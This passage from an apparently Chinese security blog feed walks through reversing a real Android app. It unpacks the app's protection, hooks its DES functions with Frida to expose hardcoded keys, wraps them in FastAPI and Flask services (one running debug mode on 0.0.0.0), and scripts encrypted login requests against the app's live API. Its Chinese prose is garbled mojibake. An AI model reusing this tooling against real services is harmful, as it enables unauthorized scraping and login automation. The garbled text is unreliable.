class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½JSè„šæœ¬</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rpc.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½è„šæœ¬å¹¶å®šä¹‰æ¶ˆæ¯å¤„ç†å‡½æ•°</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/encrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    result = script.exports.encrypt(<span class="built_in">str</span>(json_data))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    string_data = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    result = script.exports.decrypt(string_data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åŠ å¯†æ¥å£è°ƒç”¨ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121127463.png" alt="img"> </p><p>è§£å¯†æ¥å£è°ƒç”¨ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410121127040.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> rpc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida_rpcç®—æ³•è½¬å‘å®æˆ˜</title>
      <link href="/2024/10/09/frida-rpc%E7%AE%97%E6%B3%95%E8%BD%AC%E5%8F%91%E5%AE%9E%E6%88%98/"/>
      <url>/2024/10/09/frida-rpc%E7%AE%97%E6%B3%95%E8%BD%AC%E5%8F%91%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨rpcè¿›è¡Œè½¬å‘ï¼Ÿï¼Ÿï¼Ÿ</p><p>ç°åœ¨å¼€å‘appä¸»æµçš„æ–¹æ¡ˆæ˜¯Javaï¼Œä¸€äº›ä¸­å¤§å‚appæ˜¯Java+C++ï¼ŒC++æœ€åç”Ÿæˆçš„æ˜¯soï¼Œæ˜¯armæ±‡ç¼–ã€‚</p><p>ä¸€èˆ¬åˆ†æarmæ±‡ç¼–æ‰æ˜¯æœ€éš¾çš„ï¼Œæ‰€ä»¥ä¸­å¤§å‚ä¼šæ›´å€¾å‘æŠŠé‡è¦åŠ å¯†æ”¾åœ¨soä¸­ï¼Œæ¥å¢å¼ºçˆ¬è™«æˆ–è€…ç ´è§£çš„éš¾åº¦ï¼ï¼ï¼</p><p>ä½†æ˜¯å¦‚æœä½¿ç”¨rpcçš„è¯ï¼Œä½ å°±ä¸å¤ªéœ€è¦åˆ†æç¹ççš„Javaå±‚å’Œsoå±‚çš„åŠ å¯†äº†ï¼</p><p>åªéœ€è¦æ‰¾åˆ°ç‰¹å®šçš„åŠ è§£å¯†å‡½æ•°å’Œç®—æ³•ï¼Œç„¶åfridaä¸»åŠ¨è°ƒç”¨javaå±‚æˆ–soå±‚çš„æ–¹æ³•ï¼Œæ‹¿åˆ°åŠ å¯†å‰åçš„å†…å®¹å³å¯ï¼</p><h1 id="rpcè½¬å‘æ¡ˆä¾‹"><a href="#rpcè½¬å‘æ¡ˆä¾‹" class="headerlink" title="rpcè½¬å‘æ¡ˆä¾‹"></a>rpcè½¬å‘æ¡ˆä¾‹</h1><p>æœ¬æ¬¡ä½¿ç”¨çš„appæ˜¯å˜Ÿå˜Ÿç‰›ï¼Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼š</p><p><a href="http://www.downcc.com/soft/144510.html">å˜Ÿå˜Ÿç‰›åœ¨çº¿appä¸‹è½½-å˜Ÿå˜Ÿç‰›åœ¨çº¿å……å€¼ä¸‹è½½v4.50 å®‰å“ç‰ˆ-ç»¿è‰²èµ„æºç½‘ (downcc.com)</a></p><h2 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h2><p>é€šè¿‡æŠ“åŒ…ç™»å½•æ¥å£å‘ç°ï¼Œèµ°çš„æ˜¯<code>http://api.dodovip.com/api/user/login</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410100950041.png" alt="image-20241010095033975"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410100951047.png" alt="image-20241010095108007"> </p><p>æäº¤çš„è¯·æ±‚å¤´æ˜¯ä¸€ä¸ª<code>&#123;Encrypt:xxxx&#125;</code>ï¼Œè¿™ï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™å—ä½œä¸ºå¹³å¸¸çš„æ¸—é€æˆ–è€…è¿›ä¸€æ­¥åˆ†æè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸‹å‚æ•° <code>Encrypt</code> çš„ç”Ÿæˆé€»è¾‘ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>1ã€ç›´æ¥å°†appæ‹–å…¥jadxä¸­ï¼ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨<code>AndroidManifest.xml</code>æ–‡ä»¶ä¸­å£°æ˜çš„Activityåœ¨æºä»£ç ä¸­æ‰¾ä¸åˆ°ã€‚å¦‚ <code>com.dodonew.online.ui.StartActivity</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101037539.png" alt="image-20241010103728503"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101040923.png" alt="image-20241010104008891"> </p><p>2ã€è¿™æ ·çœ‹åº”è¯¥æ˜¯æœ‰åšåŠ å£³ï¼ŒæŸ¥å£³å·¥å…·æ£€æµ‹ï¼Œå‘ç°ä½¿ç”¨äº†ã€Š360åŠ å›ºã€‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101043038.png" alt="image-20241010104333008"> </p><p>3ã€è„±å£³ï¼Œç›´æ¥å°†appæ‹–è¿›åœ¨çº¿ç½‘ç«™</p><p>ç½‘å€ï¼š<strong><a href="https://nop.gs/">https://nop.gs</a></strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101046840.png" alt="image-20241010104657789"> </p><p>ç­‰ä¸Šå¤§æ¦‚å‡ åˆ†é’Ÿï¼Œå°±ä¼šè„±å¥½äº†ï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥å°±è¡Œï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101047039.png" alt="image-20241010104743014"> </p><p>4ã€å°†å¾—åˆ°çš„dexæ–‡ä»¶ï¼Œæ‹–å…¥åˆ°jadxä¸­ã€‚æœç´¢å…³é”®å­— <code>Encrypt</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101053416.png" alt="image-20241010105325361"> </p><p>æ‰¾åˆ°å¯¹åº”çš„åŠ å¯†é€»è¾‘ä½ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101104504.png" alt="image-20241010110419470">  </p><p>å¯ä»¥çœ‹åˆ°è¿™å—ä½¿ç”¨çš„æ˜¯DESåŠ è§£å¯†ï¼ŒåŠ å¯†å‡½æ•°ä¸º<code>RequestUtil.encodeDesMap</code></p><p>5ã€Objectionå¯¹è¯¥æ–¹æ³•ç›´æ¥hookï¼ŒæŸ¥çœ‹å‚æ•°ã€è¿”å›å€¼å’Œè°ƒç”¨æ ˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.dodonew.online.http.RequestUtil.encodeDesMap  --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101430415.png" alt="image-20241010143012184"> </p><p>6ã€Fridaç®€å•å†™ä¸€ä¸‹hookä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStack</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = <span class="title class_">Exception</span>.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(replaceStr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            <span class="title class_">Exception</span>.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printMap2</span>(<span class="params">map</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">cast</span>(map, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åŠ å¯†å‡½æ•°</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">data,desKey,desIV</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil encodeDesMap is call&quot;</span>)</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;RequestUtil encodeDesMap&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey:&quot;</span>,desKey)<span class="comment">//65102933</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV:&quot;</span>,desIV)<span class="comment">//32028092</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(data, desKey, desIV)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil encodeDesMap result:&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="property">paraMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.util.Map&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">addMap,append,sign</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil paraMap is call&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addMap:&quot;</span>,addMap)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addMap:&quot;</span>,<span class="title function_">printMap2</span>(addMap))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;append:&quot;</span>,append)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sign:&quot;</span>,sign)</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">paraMap</span>(addMap, append, sign)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil paraMap result:&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="property">decodeDesJson</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">data,desKey,desIV</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil decodeDesMap is call&quot;</span>)</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;RequestUtil decodeDesMap&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey:&quot;</span>,desKey)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV:&quot;</span>,desIV)</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">decodeDesJson</span>(data, desKey, desIV)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RequestUtil decodeDesMap result:&quot;</span>, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101433071.png" alt="image-20241010143305021"> </p><h2 id="æ•´ç†"><a href="#æ•´ç†" class="headerlink" title="æ•´ç†"></a>æ•´ç†</h2><p>æ ¹æ®ä¸Šé¢åˆ†æçš„ç»“æœï¼Œå¯ä»¥æ•´ç†å‡ºä¸»åŠ¨è°ƒç”¨åº”è¯¥æ˜¯è¿™æ ·è°ƒç”¨çš„ï¼Œä¸€ä¸ªåŠ å¯†ï¼Œä¸€ä¸ªè§£å¯†ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¯·æ±‚åŠ å¯†</span></span><br><span class="line"><span class="keyword">function</span>Â <span class="title function_">callparaMap</span>(<span class="params">username,Â userPwd,Â timeStamp</span>)Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">let</span>Â resultÂ =Â <span class="string">&quot;&quot;</span>;</span><br><span class="line">Â Â Â Â <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>Â (<span class="params"></span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">let</span>Â mapÂ =Â <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>).$new();</span><br><span class="line">Â Â Â Â Â Â Â Â map.<span class="title function_">put</span>(<span class="string">&quot;timeStamp&quot;</span>,Â timeStamp)</span><br><span class="line">Â Â Â Â Â Â Â Â map.<span class="title function_">put</span>(<span class="string">&quot;loginImei&quot;</span>,Â <span class="string">&quot;Androidnull&quot;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â map.<span class="title function_">put</span>(<span class="string">&quot;equtype&quot;</span>,Â <span class="string">&quot;ANDROID&quot;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â map.<span class="title function_">put</span>(<span class="string">&quot;userPwd&quot;</span>,Â userPwd)</span><br><span class="line">Â Â Â Â Â Â Â Â map.<span class="title function_">put</span>(<span class="string">&quot;username&quot;</span>,Â username)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">//</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">let</span>Â r1Â =Â <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="title function_">paraMap</span>(map,Â <span class="string">&quot;sdlkjsdljf0j2fsjk&quot;</span>,Â <span class="string">&quot;sign&quot;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">//Â console.log(&quot;r1:&quot;,Â r1)</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">//</span></span><br><span class="line">Â Â Â Â Â Â Â Â resultÂ =Â <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="title function_">encodeDesMap</span>(r1,Â <span class="string">&quot;65102933&quot;</span>,Â <span class="string">&quot;32028092&quot;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">//Â console.log(&quot;r2:&quot;,Â r2)</span></span><br><span class="line">Â Â Â Â &#125;)</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å“åº”è§£å¯†</span></span><br><span class="line"><span class="keyword">function</span>Â <span class="title function_">calldecodedesjson</span>(<span class="params">data</span>)Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">let</span>Â resultÂ =Â <span class="string">&quot;&quot;</span>;</span><br><span class="line">Â Â Â Â <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>Â (<span class="params"></span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â resultÂ =Â <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="title function_">decodeDesJson</span>(data,Â <span class="string">&quot;65102933&quot;</span>,Â <span class="string">&quot;32028092&quot;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">//Â console.log(&quot;decode:&quot;,Â decode)</span></span><br><span class="line">Â Â Â Â &#125;)</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ­å»ºæœåŠ¡"><a href="#æ­å»ºæœåŠ¡" class="headerlink" title="æ­å»ºæœåŠ¡"></a>æ­å»ºæœåŠ¡</h2><p>æ—¢ç„¶ä¸Šè¿°å·²ç»æŠŠé€»è¾‘æ‹æ¸…æ¥šäº†ï¼Œå¹¶ä¸”ä¹Ÿå·²ç»å†™å¥½çš„ä¸»åŠ¨è°ƒç”¨çš„jsä»£ç ã€‚</p><p>é‚£ä¹ˆå°±æ¥äº†ï¼Œå¦‚ä½•å’Œpythonç»“åˆåˆ°ä¸€èµ·ï¼Œè·‘æˆä¸€ä¸ªwebï¼Œè¿™æ ·çˆ¬è™«åªéœ€è¦å“åº”çš„å‚æ•°æ‹¿åˆ°è¿”å›å€¼å³å¯ã€‚</p><p><strong>ä»£ç </strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>Â fastapiÂ <span class="keyword">import</span>Â FastAPI</span><br><span class="line"><span class="keyword">import</span>Â uvicorn</span><br><span class="line"><span class="keyword">import</span>Â frida</span><br><span class="line"></span><br><span class="line">jsCodeÂ =Â <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Â Â Â Â functionÂ callparamap(username,Â userPwd,Â timeStamp)Â &#123;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â letÂ resultÂ =Â &quot;&quot;;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Java.perform(functionÂ ()Â &#123;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â letÂ mapÂ =Â Java.use(&quot;java.util.HashMap&quot;).$new();</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â map.put(&quot;timeStamp&quot;,Â timeStamp)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â map.put(&quot;loginImei&quot;,Â &quot;Androidnull&quot;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â map.put(&quot;equtype&quot;,Â &quot;ANDROID&quot;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â map.put(&quot;userPwd&quot;,Â userPwd)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â map.put(&quot;username&quot;,Â username)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â //</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â letÂ r1Â =Â Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;).paraMap(map,Â &quot;sdlkjsdljf0j2fsjk&quot;,Â &quot;sign&quot;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â //Â console.log(&quot;r1:&quot;,Â r1)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â //</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â resultÂ =Â Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;).encodeDesMap(r1,Â &quot;65102933&quot;,Â &quot;32028092&quot;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â //Â console.log(&quot;r2:&quot;,Â r2)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â &#125;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â returnÂ result;</span></span><br><span class="line"><span class="string">Â Â Â Â </span></span><br><span class="line"><span class="string">Â Â Â Â &#125;</span></span><br><span class="line"><span class="string">Â Â Â Â </span></span><br><span class="line"><span class="string">Â Â Â Â functionÂ calldecodedesjson(data)Â &#123;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â letÂ resultÂ =Â &quot;&quot;;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Java.perform(functionÂ ()Â &#123;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â resultÂ =Â Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;).decodeDesJson(data,Â &quot;65102933&quot;,Â &quot;32028092&quot;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â //Â console.log(&quot;decode:&quot;,Â decode)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â &#125;)</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â returnÂ result;</span></span><br><span class="line"><span class="string">Â Â Â Â &#125;</span></span><br><span class="line"><span class="string">Â Â Â Â rpc.exportsÂ =Â &#123;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â encrypt:Â callparamap,</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â decode:Â calldecodedesjson,</span></span><br><span class="line"><span class="string">Â Â Â Â &#125;;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#Â å‡†å¤‡å·¥ä½œ</span></span><br><span class="line"><span class="comment">#Â processÂ =Â frida.get_device_manager().add_remote_device(&#x27;192.168.3.68:27042&#x27;).attach(&quot;com.dodonew.online&quot;)</span></span><br><span class="line">processÂ =Â frida.get_usb_device().attach(<span class="string">&#x27;com.dodonew.online&#x27;</span>)</span><br><span class="line">scriptÂ =Â process.create_script(jsCode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]Â RunningÂ å°è‚©è†€&#x27;</span>)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">appÂ =Â FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Â http://127.0.0.1:8080/getencrypt?username=18903916120&amp;password=1111&amp;timestamp=1647662720061</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/getencrypt&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span>Â <span class="keyword">def</span>Â <span class="title function_">getencrypt</span>(<span class="params">username,Â password,Â timestamp</span>):</span><br><span class="line">Â Â Â Â resultÂ =Â script.exports.encrypt(username,Â password,Â timestamp)</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â &#123;<span class="string">&quot;data&quot;</span>:Â result&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>Â pydanticÂ <span class="keyword">import</span>Â BaseModel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span>Â <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">Â Â Â Â data:Â <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/getdecode&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span>Â <span class="keyword">def</span>Â <span class="title function_">getdecode</span>(<span class="params">item:Â Item</span>):</span><br><span class="line">Â Â Â Â resultÂ =Â script.exports.decode(item.data)</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â &#123;<span class="string">&quot;data&quot;</span>:Â result&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â __name__Â ==Â <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">Â Â Â Â uvicorn.run(app,Â port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œ</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101435738.png" alt="img"> </p><h2 id="æ„é€ è¯·æ±‚è°ƒç”¨"><a href="#æ„é€ è¯·æ±‚è°ƒç”¨" class="headerlink" title="æ„é€ è¯·æ±‚è°ƒç”¨"></a>æ„é€ è¯·æ±‚è°ƒç”¨</h2><p><strong>ä»£ç </strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>Â requests</span><br><span class="line"><span class="keyword">import</span>Â time</span><br><span class="line"><span class="keyword">import</span>Â json</span><br><span class="line"></span><br><span class="line">dtÂ =Â time.time()Â *Â <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Â è¯·æ±‚åŠ å¯†</span></span><br><span class="line">urlÂ =Â <span class="string">f&quot;http://127.0.0.1:8080/getencrypt?username=18903916120&amp;password=1111&amp;timestamp=<span class="subst">&#123;dt&#125;</span>&quot;</span></span><br><span class="line">r1Â =Â requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(r1.json())</span><br><span class="line"><span class="comment">#Â ç™»å½•</span></span><br><span class="line">urlÂ =Â <span class="string">&quot;http://api.dodovip.com/api/user/login&quot;</span></span><br><span class="line">headersÂ =Â &#123;</span><br><span class="line">Â Â Â Â <span class="string">&quot;Content-Type&quot;</span>:Â <span class="string">&quot;application/json;charset=utf-8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">dataÂ =Â &#123;</span><br><span class="line">Â Â Â Â <span class="string">&quot;Encrypt&quot;</span>:Â r1.json().get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">rÂ =Â requests.post(url=url,Â headers=headers,Â data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span 